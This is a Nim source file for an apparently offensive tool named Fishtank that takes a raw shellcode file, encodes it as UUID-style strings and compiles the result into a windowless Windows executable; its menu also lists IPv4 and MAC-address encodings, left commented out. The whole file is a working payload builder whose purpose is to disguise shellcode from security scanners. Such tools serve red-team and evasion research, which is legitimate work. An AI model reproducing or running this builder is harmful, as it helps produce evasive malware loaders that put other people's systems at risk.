#  _____ _     _   _____           _    
# |  ___(_)___| |_|_   _|_ _ _ __ | | __
# | |_  | / __| '_ \| |/ _` | '_ \| |/ /
# |  _| | \__ \ | | | | (_| | | | |   < 
# |_|   |_|___/_| |_|_|\__,_|_| |_|_|\_\
#                                       

import winim
import std/[os]
# import ptr_math
# import strformat
import obfuscation/[mahimahi]
import supports/[write_array]

proc printMenu() =
  echo """
  Usage:
    Fishtank.exe <file_path> <Shellcode Obfuscation Method>
    
    Example:
      Fishtank.exe shellcodes/calc.bin mahimahi

  Arguments:
    file_path   Path to the shellcode file.
    Shellcode Obfuscation Method      FishTank.exe -h obfuscation to see supported methods.

  Options:
    -h, --help  Displays help message.
    
    Obfuscation Menu:
      Available obfuscation strings:
        - salmon :: Shellcode to UUID strings
        - tuna :: Shellcode to IPv4 strings
        - catfish :: Shellcode to MAC address strings
        - mahimahi :: Shellcode to Aquarium strings
  """

# proc printObfuscationMenu() =
#   echo """
#   Obfuscation Menu:
#     Available obfuscation strings:
#       - salmon :: Shellcode to some strings
#       - tuna :: Shellcode to MAC address strings
#       - catfish :: Shellcode to IPv4 address strings
#       - mahimahi :: Shellcode to UUID strings
#  """

proc main() =
  let args = commandLineParams()
  if args.len == 0 or (args.len == 1 and (args[0] == "-h" or args[0] == "--help")):
    printMenu()
  elif args.len < 2:
    echo "Error: Not enough arguments provided."
    printMenu()
  else:
    let filePath = args[0]
    let obfuscation = args[1]
    case obfuscation:
    of "mahimahi":
      let (uuidArray, uuidCount) = binToUuids(filePath)
      let outputExe = "outputs/output.exe"
      let outputFilename = write_array("mahimahi", uuidArray, uuidCount)
      let absoluteOutputFilename = absolutePath(outputFilename)
      let absoluteOutputExe = absolutePath(outputExe)
      let compileCommand = "nim c --app=gui --cpu=amd64 --out:\"" & absoluteOutputExe & "\" \"" & absoluteOutputFilename & "\""
      discard execShellCmd(compileCommand)
    # of "catfish":
    #   let (ipv4Array, ipv4Count) = binToIpv4s(filepath)
    #   var i = 0
    #   while ipv4Array[i] != nil:
    #     echo $ipv4Array[i]
    #     inc i
    #   echo ipv4Count
    # of "tuna":
      #let (macArray, macCount) = binToMACs(filepath)
      # var i = 0
      # while macArray[i] != nil:
      #   echo $macArray[i]
      #   inc i
      # echo macCount
main()
